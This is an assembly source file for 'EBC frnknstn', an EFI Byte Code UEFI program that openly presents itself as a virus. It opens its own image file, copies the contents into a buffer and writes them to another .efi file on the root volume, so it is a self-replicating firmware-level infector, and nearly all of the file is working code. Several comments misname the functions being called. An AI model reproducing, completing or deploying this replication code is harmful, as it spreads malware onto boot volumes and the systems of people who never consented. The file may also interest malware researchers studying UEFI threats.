;**************************************************************************;
;*                      EBC frnknstn                                      *;
;*                      from the crypts of UEFI hell                      *;
;*                      a monster emerges                                 *;
;*                              ...                                       *;
;*                      welcome home darling.                             *;
;*                      EFI Byte Code Edition.                            *;
;*                              by ic3qu33n                               *;
;*                                                                        *;
;**************************************************************************;

;****************************************************************************;
;                       global macros                                        ;
;               UEFIMarkEbcEdition fasm macros for assembly                  ;
;****************************************************************************;
; Macro for assembling EBC instructions
include '../UEFIMarkEbcEdition-fasm/ebcmacro/ebcmacro.inc' 

; Macro for assembling EBC-Native x86 gates
include '../UEFIMarkEbcEdition-fasm/x86/x86macro.inc'


format pe64 dll efi
entry main
section '.text' code executable readable
main:
;****************************************************************************;
;                       main func for frnknstn.efi
;****************************************************************************;

;**** Load R1 with address of Global_Variables_Pool
; Using manusov's convention of MOVRELW for loading R1 with address of
; Global_Variables_Pool
; MOVRELW uses 16-bit operand for IP-relative offset

                MOVRELW         R1,Global_Variables_Pool - Anchor_IP
Anchor_IP:
;*********** Save global vars gST and ImageHandle to Global_Variables_Pool**;
                MOVNW           R2,@R0,0,16           ; R2=ImageHandle
                MOVNW           R3,@R0,1,16           ; R3=EFI_SYSTEM_TABLE *gST
                MOVQW           @R1,0,_EFI_Handle,R2  ; Save ImageHandle
                MOVQW           @R1,0,_EFI_Table,R3   ; Save gST

                MOVIQW          R2,_vxtitle
                ADD64           R2,R1              ;addr for unicode str in data
                CALL32          printstring            

                MOVIQW          R2,_vxcopyright
                ADD64           R2,R1              ;addr for unicode str in data
                CALL32          printstring                     

;****************************************************************************;
;       new_handle_protocol sets up call to UEFI API HandleProtocol() func
;       and retrieves LoadedImageProtocol* interface pointer
; input: 
;       [parameter 1]  r2: ImageHandle
;       [parameter 2]  r3: protocol GUID
;       [parameter 3]  r0: pointer to protocol interface
;
; output: r7= UEFI status
;         r4 = protocol interface pointer (if UEFI status == 0)
;****************************************************************************;
get_loaded_image_protocol:
                MOVQW           R2, @R1,0,_EFI_Handle
                MOVIQQ          R3, efiLoadedImageProtocolGuid
;****save registers********
                PUSH64          R3
                PUSH64          R4
                PUSH64          R5
                PUSH64          R6
;****construct stack frame for native API call********
                XOR64           R7,R7
                PUSHN           R7
                MOVQ            R7,R0
                PUSHN           R0         ;push 3rd parameter (protocol ptr)
                PUSHN           R3         ;param 2:ptr LoadedImageProtocol GUID
                PUSHN           R2         ; param 1: Image Handle
;*** Load gBS target function for UEFI API native call with CALLEX
                MOVNW           R3,@R1,0,_EFI_Table ; R3 = EFI_SYSTEM_TABLE *gST
                MOVNW           R3,@R3,9,24  ; gST->EFI_BOOT_SERVICES_TABLE* gBS
                CALL32EXA       @R3,16,24    ; gBS entry #16- HandleProtocol
;****destroy stack frame********
                POPN            R2              ; pop parameter #1
                POPN            R3              ; pop parameter #2
                POPN            R3              ; pop parameter #3,
                                                ; loadedImageProtocol* ptr
                POPN            R2              ; pop parameter #4
;****restore saved registers********
                POP64           R6
                POP64           R5
                POP64           R4
                POP64           R3
                
                ;get and save EFI_DEVICE_PATH_PROTOCOL *filepath      
                MOVQW           @R1,0,_Loaded_Image_Protocol, R2
                MOVNW           R3,@R2,6,8      ;correct offset for *filepath
                MOVQW           @R1,0,_LoadedImg_DeviceHandle, R3
                MOVQ            R2, R3
                CALL32          printstring
                ;save UINT64 ImageSize        
                MOVIWW           @R1,0,_ImageSize, 0x800

;**************************************************************************;
; get_sfsp: 
;       retrieves pointer to SFSP interface using gBS->LocateProtocol() func
;
;;  input: 
;       [parameter 1]  r2: protocol GUID
;       [parameter 2]  r3: pointer to protocol interface (initialized to NULL)
;       
;       We also push the following to the EBC stack before the call:
;               r0 - (stack addr) so we return the addr to loc on stack
;               r4 - NULL, for 16-byte alignment
;
;; output: r7= UEFI status
;         r2 = protocol interface pointer (if UEFI status == 0)
;**************************************************************************;
get_sfsp:        
                MOVIQQ          R2,efiSimpleFilesystemProtocolGuid
;****construct stack frame for native API call********
                XOR64           R4,R4
                PUSHN           R4              ;rly just need for alignment
                MOVQ            R4,R0
                PUSHN           R0              ; stack pointer
                XOR64           R3,R3
                PUSHN           R3              ; output sfsp pointer,
                                                ;  initialized to NULL
                PUSHN           R2              ; param 1: pointer to SFSP GUID
;*** Load gBS target function for UEFI API native call with CALLEX
                MOVNW           R3,@R1,0,_EFI_Table ;R3 = SysTable          
                MOVNW           R3,@R3,9,24   ;gST->EFI_BOOT_SERVICES_TABLE* gBS
                CALL32EXA       @R3,37,24     ;gBS entry #37 - LocateProtocol() 
;****destroy stack frame********
                POPN            R2              
                POPN            R3              
                POPN            R3              
                POPN            R2              ; result sfsp pointer in r2
                
;**************************************************************************;
;       sfsp_openrootvolume: Use EFI_SIMPLE_FILESYSTEM_PROTOCOL * sfsp
;       call sfsp->OpenVolume() to retrieve root volume
;
;
;**************************************************************************;
sfsp_openrootvolume:
                MOVQW           @R1,0,_File_System_Protocol, R2
;****construct stack frame for native API call********
                XOR64           R4,R4
                PUSHN           R4
                MOVQ            R3, R0
                PUSHN           R3              ;push stack address 
                PUSHN           R2
;*** Load SFSP target function for UEFI API native call with CALLEX
                CALL32EXA       @R2,0,8
;****destroy stack frame********
                POPN            R2
                POPN            R3
                POPN            R2
;;save returned rootvolume pointer      
                MOVQW           @R1,0,_RootVolume, R2
;****check EFI_STATUS and handle errors********
                MOVSNW          R7,R7
                CMPI64WUGTE     R7,1         ; Check status == EFI_SUCCESS
                JMP8CS          exit 
                CMPI64WEQ       R2,0         ; Check protocol pointer != NULL

;**************************************************************************;
;       open host file
; EFI_FILE_PROTOCOL Open Host File \\frnknstn.efi
;**************************************************************************;
open_hostfile:
                MOVQW           R3, @R1,0,_LoadedImg_DeviceHandle 
                                                ;move target filename into r4
;****construct stack frame for native API call********
                XOR64           R7,R7
                PUSHN           R7              ;rly just need for alignment
                MOVQ            R7,R0
                XOR64           R5,R5
                PUSH64          R5               ;param 5: attributes (0x0)
                MOVIQQ          R4,0000000000000003h  ;param 4: file openmode
                PUSH64          R4              ;param 4: file openmode
                PUSHN           R3              ; param3: target filename
                PUSHN           R7              ; param2: output fileprotocol 
                                                ;       ptr, initialized to NULL
                                                ; param2 == r0 (stack addr) 
                                                ;    so we return the addr to 
                                                ;    loc on stack
                PUSHN           R2              ; Parm#1 = pointer to rootvolume
                CALL32EXA       @R2,0,8         ; EFI_FILE_PROTOCOL->OpenFile()
;****destroy stack frame********
                POPN            R2              
                POPN            R3              
                POP64           R4              
                POP64           R5
                POPN            R6              
                POPN            R2         ; result handle to file pop'd into r2
;****check EFI_STATUS and handle errors********
                MOVSNW          R7,R7
                CMPI64WUGTE     R7,1            ; Check status == EFI_SUCCESS
                JMP8CS          exit 
                CMPI64WEQ       R2,0            ; Check protocol pointer != NULL
;save retrieved EFI_FILE_PROTOCOL pointer to hostfile
                MOVQW           @R1,0,_HostFile, R2
                MOVQW           R2,@R1,0,_RootVolume

;**************************************************************************;
;       open target file
; EFI_FILE_PROTOCOL Open Target File \\ebc-4.efi
;**************************************************************************;
open_targetfile:
                MOVIQW          R3, _targetfilename ;target filename into r4
;                MOVIQW          R3,0x800 ;target filename into r4
                ADD64           R3, R1
;****construct stack frame for native API call********
                XOR64           R7,R7
                PUSHN           R7              ;rly just need for alignment
                MOVQ            R7,R0
                XOR64           R5,R5
                PUSH64          R5               ;param 5: attributes (0x0)
                MOVIQQ          R4,8000000000000003h  ;param 4: file openmode
                PUSH64          R4              ;param 4: file openmode
                PUSHN           R3              ; param3: target filename
                PUSHN           R7              ; param2: output fileprotocol
                                                ;       ptr, initialized to NULL
                                                ; param2 == r0 (stack addr) 
                                                ;   so we return the addr to
                                                ;   loc on stack
                PUSHN           R2              ; param1: pointer to rootvolume
                CALL32EXA       @R2,0,8         ; EFI_FILE_PROTOCOL->OpenFile()
;****destroy stack frame********
                POPN            R2              
                POPN            R3              
                POP64           R4              
                POP64           R5              
                POPN            R6              
                POPN            R2              ; result file handle in r2
;****check EFI_STATUS and handle errors********
                MOVSNW          R7,R7
                CMPI64WUGTE     R7,1            ; Check status == EFI_SUCCESS
                JMP8CS          exit 
                CMPI64WEQ       R2,0            ; Check protocol pointer != NULL
;save retrieved EFI_FILE_PROTOCOL pointer to targetfile
                MOVQW           @R1,0,_TargetFile, R2

;**************************************************************************;
;  allocate temp buffer with AllocatePool to store file contents read
;  with EFI_FILE_PROTOCOL.Read()
;**************************************************************************;
AllocatePool_tempbuffer:
                ;MOVIQQ          R3,_ImageSize       ;imagesize 
                MOVIQQ          R3,0x800       ;imagesize 
;****construct stack frame for native API call********
                XOR64           R4,R4
                PUSHN           R4              ;rly just need for alignment
                MOVQ            R4,R0
                PUSHN           R0              ; stack pointer
                PUSHN           R3              ; param 2: imagesize 
                XOR64           R2,R2
                PUSHN           R2              ; param 1: EFI_MEMORY_TYPE=
                                                ;          AllocateAnyPages
                MOVNW           R3,@R1,0,_EFI_Table    ; R3 = SysTable    
                MOVNW           R3,@R3,9,24   ;gST->EFI_BOOT_SERVICES_TABLE* gBS
                CALL32EXA       @R3,5,24      ;gBS entry #5 - AllocatePool
;****destroy stack frame********
                POPN            R2              
                POPN            R3              
                POPN            R3              
                POPN            R2              ; void** tempbuffer in r2
;save returned pointer to allocated buffer to global var TempBuffer 
                MOVQ            R4,R2 
                MOVQQ           @R1,0,_TempBuffer, R4
                JMP8            read_host_file

;**************************************************************************;
;       read_host_file
; Read contents of host file frnknstn.efi to tempbuffer
;**************************************************************************;
read_host_file:
                MOVQW           R4,@R1,0,_TempBuffer  ;param 2: UINTN* filesize
                                              ; (movqw bc indirect address load)
                MOVQW           R2,@R1,0,_HostFile ; move EFI_FILE_PROTOCOL
                                                   ;  *targetfile to r2
;****construct stack frame for native API call********
                PUSH64          R3              ;R3 is return value from prev
call (targetfile size)
                XOR64           R7,R7
                MOVQ            R7,R0
                PUSHN           R4              ; param 3: tempbuffer
                PUSHN           R7              ; param 2: targetfile size
                PUSHN           R2              ; param 1: fileprotocol ptr for
                                                ;          hostfile
                CALL32EXA       @R2,3,8         ; EFI_FILE_PROTOCOL->OpenFile()
;****destroy stack frame********
                POPN            R2              
                POPN            R3              
                POPN            R4              ; result BufferSize in r3       
                POP64           R2              ; result pointer to buffer in r2
;****check EFI_STATUS and handle errors********
                MOVSNW          R7,R7
                CMPI64WUGTE     R7,1            ; Check status == EFI_SUCCESS
                JMP8CS          exit 
                CMPI64WEQ       R2,0            ; Check protocol pointer != NULL

;**************************************************************************;
;       write_target_file
; Write contents of tempbuffer (file contents of frnknstn.efi) to targetfile
;**************************************************************************;
write_target_file:
                MOVQW           R4,@R1,0,_TempBuffer ;move tempbuffer ptr to r4
                MOVQW           R3,@R1,0,_ImageSize
                MOVQW           R2,@R1,0,_TargetFile ; move EFI_FILE_PROTOCOL
                                                     ;  *targetfile to r2
;****construct stack frame for native API call********
                PUSH64          R3
                XOR64           R7,R7
                MOVQ            R7,R0
                PUSHN           R4              ; param 3: tempbuffer
                PUSHN           R7              ; param 2: targetfile size
                PUSHN           R2              ; param 1: fileprotocol ptr for
                                                ;          hostfile
                CALL32EXA       @R2,4,8         ; EFI_FILE_PROTOCOL->WriteFile()
;****destroy stack frame********
                POPN            R2              
                POPN            R3              
                POPN            R4              ; result BufferSize in r3       
                POP64           R2              ; result pointer to buffer in r2

;**************************************************************************;
;       cleanup
;  close host file frnknstn.efi
;  close target file ebc-4.efi
;  free temp_buffer
;**************************************************************************;
cleanup:
                MOVQW           R2,@R1,0,_TargetFile
                CALL32          close_file
                MOVQW           R2,@R1,0,_HostFile
                CALL32          close_file
                MOVQW           R2,@R1,0,_TempBuffer
                CALL32          free_pool
                JMP8            vxend

;**************************************************************************;
;       close_host_file
; close host file frnknstn.efi passed in R2
;
;**************************************************************************;
close_file:
                PUSH64          R3
                PUSH64          R2
                PUSH64          R5
                PUSH64          R6
;****construct stack frame for native API call********
                XOR64           R7,R7
                MOVQ            R7,R0
                PUSHN           R7
                PUSHN           R2              ; param 1: fileprotocol ptr for
                                                ;          hostfile
                CALL32EXA       @R2,5,8         ; EFI_FILE_PROTOCOL->CloseFile()
;****destroy stack frame********
                POPN            R2              
                POPN            R3              
;****check EFI_STATUS and handle errors********
                MOVSNW          R7,R7
                CMPI64WUGTE     R7,1            ; Check status == EFI_SUCCESS
                JMP8CS          exit 
                CMPI64WEQ       R2,0            ; Check protocol pointer != NULL
                POP64           R6
                POP64           R5
                POP64           R4
                POP64           R3
                RET

;**************************************************************************;
;       free_pool
;; frees the allocated buffer passed in R2
;**************************************************************************;
free_pool:
                PUSH64          R3
                PUSH64          R2
                PUSH64          R5
                PUSH64          R6
;****construct stack frame for native API call********
                XOR64           R4,R4
                MOVQ            R4,R0
                PUSHN           R0              ; stack pointer
                PUSHN           R2              ; param 1: EFI_MEMORY_TYPE =
AllocateAnyPages
                MOVNW           R3,@R1,0,_EFI_Table ; R3 = EFI_SYSTEM_TABLE *gST
                MOVNW           R3,@R3,9,24  ; gST->EFI_BOOT_SERVICES_TABLE* gBS
                CALL32EXA       @R3,6,24     ; gBS entry #37 - LocateProtocol()
;****destroy stack frame********
                POPN            R3              
                POPN            R2              ; void** tempbuffer in r2
;****check EFI_STATUS and handle errors********
                MOVSNW          R7,R7
                CMPI64WUGTE     R7,1            ; Check status == EFI_SUCCESS
                JMP8CS          exit 
                CMPI64WEQ       R2,0            ; Check protocol pointer != NULL
                POP64           R6
                POP64           R5
                POP64           R4
                POP64           R3
                RET

vxend:
exit:  
                XOR64           R7,R7             ; UEFI Status = 0
                RET                               ; Return to EBCVM  parent func


printstring:
                PUSH64          R3
                PUSH64          R2
                PUSH64          R5
                PUSH64          R6
                PUSH64          R3
                PUSH64          R2
;--- Read pointer and handler call ---
                MOVNW           R3,@R1,0,_EFI_Table   ; R3 = SysTable  
                MOVNW           R3,@R3,5,24           ; gST->ConOut

                PUSHN           R2              ; push param #2 = ptr to CHAR16
                                                ;               string to print
                PUSHN           R3              ; push param #1: gST->ConOut
                CALL32EXA       @R3,1,0         ; ConOut
;--- Remove stack frame ---
                POPN            R3              ; pop parameter #1
                POPN            R2              ; pop parameter #2
                POP64           R2
                POP64           R3
;****check EFI_STATUS and handle errors********
;               MOVSNW          R7,R7
;               CMPI64WUGTE     R7,1            ; Check status == EFI_SUCCESS
;               JMP8CS          exit
;               CMPI64WEQ       R2,0            ; Check protocol pointer != NULL
               POP64           R6
               POP64           R5
               POP64           R4
               POP64           R3
               RET

;**************************************************************************;
;; Global Vars
; strings, UEFI GUIDS, the gang's all here
;
;**************************************************************************;
;***Address offsets for strings in GlobalVarPool
;**************************************************************************;
_vxtitle		= vxtitle - Global_Variables_Pool
_vxcopyright	= vxcopyright - Global_Variables_Pool
_targetfilename         = targetfilename - Global_Variables_Pool

;**************************************************************************;
;***strings in GlobalVarPool
;**************************************************************************;
vxtitle		DW  'E','B','C',' ','f','r','n','k','n','s','t','n',0x0d,0x0a,0
vxcopyright	DW  0x0d,0x0a,'b','y',' ','i','c','3','q','u','3','3','n',0x0d,0x0a,0
targetfilename          DW  '\','e','b','c','-','4','.','e','f','i',0

efiLoadedImageProtocolGuid:
DD 0x5b1b31a1
DW 0x9562,0x11d2
DB 0x8E,0x3F,0x00,0xA0,0xC9,0x69,0x72,0x3B

efiSimpleFilesystemProtocolGuid:
DD 0x964e5b22
DW 0x6459,0x11d2
DB 0x8e,0x39,0x00,0xa0,0xc9,0x69,0x72,0x3b

efiGOPGuid:
DD 0x9042a9de
DW 0x23dc,0x4a38
DB 0x96,0xfb,0x7a,0xde,0xD0,0x80,0x51,0x6a

efiFileInfoGuid:
DD 0x09576e92
DW 0x6d3f, 0x11d2
DB 0x8e,0x39,0x00,0xa0,0xc9,0x69,0x72,0x3b

section '.data' data readable writeable
;**************************************************************************;
;                       data - global vars
;**************************************************************************;
; again, using manusov convention here for data accesses to global vars
; global vars referenced with 16-bit offsets relative to
; Global_Variables_Pool

_EFI_Handle		= EFI_Handle - Global_Variables_Pool
_EFI_Table		= EFI_Table - Global_Variables_Pool

_File_System_Protocol	= File_System_Protocol - Global_Variables_Pool
_Loaded_Image_Protocol	= Loaded_Image_Protocol - Global_Variables_Pool
_LoadedImg_DeviceHandle = LoadedImg_DeviceHandle - Global_Variables_Pool 
_ImageSize		= ImageSize - Global_Variables_Pool
_RootVolume		= RootVolume - Global_Variables_Pool
_HostFile		= HostFile - Global_Variables_Pool
_TargetFile		= TargetFile - Global_Variables_Pool	
_TempBuffer		= TempBuffer - Global_Variables_Pool
_EFI_Status		= EFI_Status - Global_Variables_Pool

Global_Variables_Pool:
;************ Saved global vars ********************************************;
EFI_Handle		DQ  ?		; This application handle
EFI_Table		DQ  ?		; System table address
;**************************************************************************;
; Protocol interface pointers
;**************************************************************************;
File_System_Protocol	DQ  ?		; Simple File System protocol
Loaded_Image_Protocol	DQ  ?		; LoadedImageProtocol 
;**************************************************************************;
;Data for file replication 
;**************************************************************************;
LoadedImg_DeviceHandle  DQ  ?		; DeviceHandle of LoadedImageProtocol
ImageSize		DQ  ?		; ImageSize (LoadedImageProtocol)
RootVolume		DQ  ?		; Root Volume of mounted fs FS0:
HostFile		DQ  ?		; Host file for self-replication
TargetFile		DQ  ?		; Target file for self-replication
TempBuffer		DQ  ?		; temporary buffer for file r/w ops
EFI_Status		DQ  ?		; UEFI Status, unified for 32 and 64
;**************************************************************************;
;                     .reloc section                                       ;
;**************************************************************************;
; manusov convention, .reloc section not used 
section '.reloc' fixups data discardable

